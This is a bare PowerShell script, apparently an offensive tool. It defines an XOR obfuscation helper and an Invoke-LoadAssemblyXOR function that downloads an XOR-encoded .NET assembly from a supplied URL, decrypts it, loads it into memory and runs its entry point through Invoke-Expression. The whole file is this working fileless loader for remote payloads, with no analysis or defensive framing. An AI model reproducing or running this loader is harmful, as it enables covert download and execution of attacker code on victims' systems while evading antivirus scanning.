$enc = [System.Text.Encoding]::UTF8

function xor {
    param($string, $method, $key)
    $xorkey = $enc.GetBytes($key)

    if ($method -eq "decrypt"){
        $string = $enc.GetString([System.Convert]::FromBase64String($string))
    }

    $byteString = $enc.GetBytes($string)
    $xordData = $(for ($i = 0; $i -lt $byteString.length; ) {
        for ($j = 0; $j -lt $xorkey.length; $j++) {
            $byteString[$i] -bxor $xorkey[$j]
            $i++
            if ($i -ge $byteString.Length) {
                $j = $xorkey.length
            }
        }
    })

    if ($method -eq "encrypt") {
        $xordData = [System.Convert]::ToBase64String($xordData)
    } else {
        $xordData = $enc.GetString($xordData)
    }
    
    return $xordData
}


function Invoke-LoadAssemblyXOR
{
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, Mandatory = $true)]
        [ValidateNotNullorEmpty()]
        [String]
        $AssemblyUrl,
        [Parameter(Position = 1, Mandatory = $true)]
        [ValidateNotNullorEmpty()]
        [String]
        $KeyString,
        [Parameter(Position = 2, Mandatory = $false)]
        [String]
        $Command
        )

    $WebClient = New-Object System.Net.WebClient
    $xorb64_bin = $WebClient.DownloadString($AssemblyUrl);
    [Byte[]]$AssemblyBytes = [System.Convert]::FromBase64String((xor $xorb64_bin "decrypt" $KeyString));
    $assembly = [System.Reflection.Assembly]::Load($AssemblyBytes)

    $ep = $assembly.EntryPoint
    $ldrcommand = "[" + $ep.reflectedtype.namespace + "." + $ep.reflectedtype.name + "]::" + $ep.name + '($Command.Split(" "))'
    echo $ldrcommand
    Invoke-Expression $ldrcommand
}
